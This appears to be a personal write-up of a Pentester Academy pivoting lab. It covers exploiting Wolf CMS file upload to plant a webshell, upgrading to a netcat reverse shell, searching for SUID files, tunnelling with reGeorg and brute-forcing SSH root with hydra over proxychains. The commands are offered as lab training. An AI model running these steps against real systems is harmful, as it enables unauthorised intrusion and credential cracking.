---
title: Pivoting VIII
date: 2022-06-06 12:00:00 -500
categories: [Pentesting,Pivoting]
tags: [Pentester Academy,Metasploit]
---

# Pivoting VIII

# Steps taken:
#### 1. Check your network configuration:

![](/assets/img/1630.png)

#### 2. Scan the network of the target machine:

![](/assets/img/1631.png)

#### 3. Check vulnerabilities of the webpage:
```bash
nmap -Pn --script=vuln 192.219.188.3
```
#### 4. Check all the available directories of the webpage using dirbuster:

		- Note that this is to figure out where to login with the admin credentials found via phishing.
	
![](/assets/img/1632.png)

	- Nevermind! This is the link:

![](/assets/img/1633.png)

	- Note that have you not have the link given to you in the instructions, you will need to use dirbuster (or something like it) to figure out what this link to login into the webpage cause even if you have the credentials acquired via phishing, it still doesn't matter.

#### 5. Login with the credentials provided:

![](/assets/img/1634.png)

#### 6. Check exploits for "Wolf CMS":

![](/assets/img/1635.png)

	- There are a lot actually!
	- Wolf CMS 0.8.2 - Arbitrary File Upload (Metasploit)
	- The instructions for this is ate Wolf CMS - Arbitrary File Upload / Execution

#### 7. There is a file page in the website:

![](/assets/img/1636.png)

	- In this case, try to use an "Arbitrary File Upload/Execution" exploit!

#### 8. Check the Wolf CMS version:

![](/assets/img/1637.png)

		- This version is vulnerable to the chosen exploit above!

![](/assets/img/1638.png)

	- This is taken from the exploit.

#### 9. Through the use dirbuster, we figure out where the uploaded files land, which in this case is the webshell:

![](/assets/img/1639.png)

#### 10. Interacting with the webshell:

![](/assets/img/1640.png)

#### 11. Upgrading webshell to reverse shell:

		- Set up a listener on the local shell with netcat:

```bash
nc -lvnp 8080
```
		- Now, execute the "php-reverse-shell.php". Note that this is a modified one and tailored to the port and IP address appropriate in this use.

- Executing it:

![](/assets/img/1641.png)

- Outcome:

![](/assets/img/1642.png)

	- Works!

#### 12. Now, find the flag!
```bash
find / -name *flag*
```

![](/assets/img/1643.png)

![](/assets/img/1644.png)

**Note: If you lose the reverse shell, just restart firefox to be able to execute the php reverse shell in the web server again.**

#### 13. Escalating Privilege: Find SUID files
```bash
find / -perm -u=s -type f 2>/dev/null
```

![](/assets/img/1645.png)

#### 14. Get the internal network:

![](/assets/img/1646.png)

		- The internal network resides at 192.33.196.0/24

### Since you don't have root privileges, you can't create a pivot in this compromised machine!

#### 15. Create a pivot using reGeorg

		- Finish up the writeup tomorrow!
```bash
python reGeorgSocks.py -p 9050 -u http://{target-ip}/public/tunnel.php
```
		- Do this AFTER uploading the php file on the webserver.
		- Note that creation of this pivot is only possible because of the "upload" capabilities of the webpage.

		- Is there any other way to create a pivot had it not been possible to upload any file in this webpage given that you only have the lowest privilege?

#### 16. Now, you can do NMAP + Hydra + SSH via proxyhains.
```bash
proxychains nmap -sT -Pn {target-ip-internal}
```
```bash
proxychains hydra {target-ip} ssh -t 4 -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt -f -V
```
```bash
proxychains ssh root@{target-ip}
```
		- Then enter the password you cracked with Hydra!

